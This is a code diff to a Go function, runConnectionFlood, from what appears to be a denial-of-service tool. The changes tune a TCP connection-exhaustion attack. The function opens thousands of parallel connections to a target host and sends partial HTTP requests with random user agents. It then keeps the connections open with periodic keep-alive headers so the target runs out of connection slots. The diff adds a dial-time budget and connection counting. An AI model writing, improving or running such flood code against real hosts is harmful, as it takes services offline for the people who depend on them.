@@ -10,10 +10,6 @@ import (
 	"time"
 )
 
-// TCP Connection Exhaustion
-// Open as many TCP connections as possible, hold them open
-// Targets max file descriptor limit (usually 65535 on Linux, lower on default config)
-
 func runConnectionFlood(cfg *AttackConfig) {
 	atomic.StoreInt32(&stopFlag, 0)
 	startTime := time.Now()
@@ -44,24 +40,26 @@ func runConnectionFlood(cfg *AttackConfig) {
 	if maxConns < 1000 {
 		maxConns = 5000
 	}
-	
-	// Adjust for short duration tests - can't open 5000 connections in 10s
-	if cfg.Duration <= 15 {
-		maxConns = cfg.Duration * 100 // 10s = 1000 conns, 15s = 1500 conns
-		if maxConns < 500 {
-			maxConns = 500
-		}
-	}
 
-	log.Printf("Connection Exhaustion: opening %d TCP connections to %s:%s", maxConns, host, port)
+	dialPhaseBudget := time.Duration(cfg.Duration) * time.Second
+	if dialPhaseBudget > 30*time.Second {
+		dialPhaseBudget = 30 * time.Second
+	}
+	dialDeadline := startTime.Add(dialPhaseBudget)
+
+	log.Printf("Connection Exhaustion: opening up to %d TCP connections to %s:%s (dial budget: %v)", maxConns, host, port, dialPhaseBudget)
 
 	connections := make([]net.Conn, 0, maxConns)
 	var connMu sync.Mutex
 
-	semaphore := make(chan struct{}, 200) // 200 parallel dials at once
+	semaphore := make(chan struct{}, 200)
 
 	var wg sync.WaitGroup
+	var dialed int32
 	for i := 0; i < maxConns; i++ {
+		if time.Now().After(dialDeadline) || atomic.LoadInt32(&stopFlag) == 1 {
+			break
+		}
 		wg.Add(1)
 		semaphore <- struct{}{}
 		go func() {
@@ -77,7 +75,7 @@ func runConnectionFlood(cfg *AttackConfig) {
 				return
 			}
 
-		dial := createDialer("", 5*time.Second)
+			dial := createDialer("", 5*time.Second)
 			conn, err := dial("tcp", host+":"+port)
 			if err != nil {
 				atomic.AddInt64(&metrics.Failed, 1)
@@ -105,7 +103,6 @@ func runConnectionFlood(cfg *AttackConfig) {
 				conn = tlsConn
 			}
 
-			// Send partial HTTP request to keep connection in active state
 			partial := []byte("GET / HTTP/1.1\r\nHost: " + host + "\r\nUser-Agent: " + randomUA() + "\r\n")
 			conn.Write(partial)
 
@@ -116,18 +113,15 @@ func runConnectionFlood(cfg *AttackConfig) {
 			atomic.AddInt64(&metrics.Completed, 1)
 			atomic.AddInt64(&metrics.TotalRequests, 1)
 			atomic.AddInt64(&metrics.InFlight, 1)
+			atomic.AddInt32(&dialed, 1)
 		}()
 	}
 
 	wg.Wait()
 
-	connMu.Lock()
-	openCount := len(connections)
-	connMu.Unlock()
+	openCount := atomic.LoadInt32(&dialed)
+	log.Printf("Held %d TCP connections, sustaining for remaining duration", openCount)
 
-	log.Printf("Held %d TCP connections, sustaining for %v", openCount, time.Until(deadline))
-
-	// Periodically send keep-alive bytes to maintain connections
 	keepAliveTicker := time.NewTicker(15 * time.Second)
 	defer keepAliveTicker.Stop()
 
@@ -139,7 +133,7 @@ func runConnectionFlood(cfg *AttackConfig) {
 		select {
 		case <-keepAliveTicker.C:
 			connMu.Lock()
-			alive := connections[:0]
+			var alive []net.Conn
 			for _, conn := range connections {
 				_, err := conn.Write([]byte("X-Keep-Alive: " + randomUA() + "\r\n"))
 				if err == nil {
@@ -147,11 +141,12 @@ func runConnectionFlood(cfg *AttackConfig) {
 				} else {
 					conn.Close()
 					atomic.AddInt64(&metrics.InFlight, -1)
+					atomic.AddInt32(&dialed, -1)
 				}
 			}
 			connections = alive
 			connMu.Unlock()
-			log.Printf("Keep-alive cycle: %d connections still active", len(connections))
+			log.Printf("Keep-alive cycle: %d connections still active", atomic.LoadInt32(&dialed))
 		case <-time.After(1 * time.Second):
 		}
 	}
@@ -159,12 +154,15 @@ func runConnectionFlood(cfg *AttackConfig) {
 	connMu.Lock()
 	for _, conn := range connections {
 		conn.Close()
+		atomic.AddInt64(&metrics.InFlight, -1)
 	}
 	connections = nil
 	connMu.Unlock()
 
+	atomic.StoreInt64(&metrics.InFlight, 0)
+
 	metricsMu.Lock()
 	metrics.Elapsed = time.Since(startTime).Seconds()
+	metrics.CurrentRPS = 0
 	metricsMu.Unlock()
 }
-
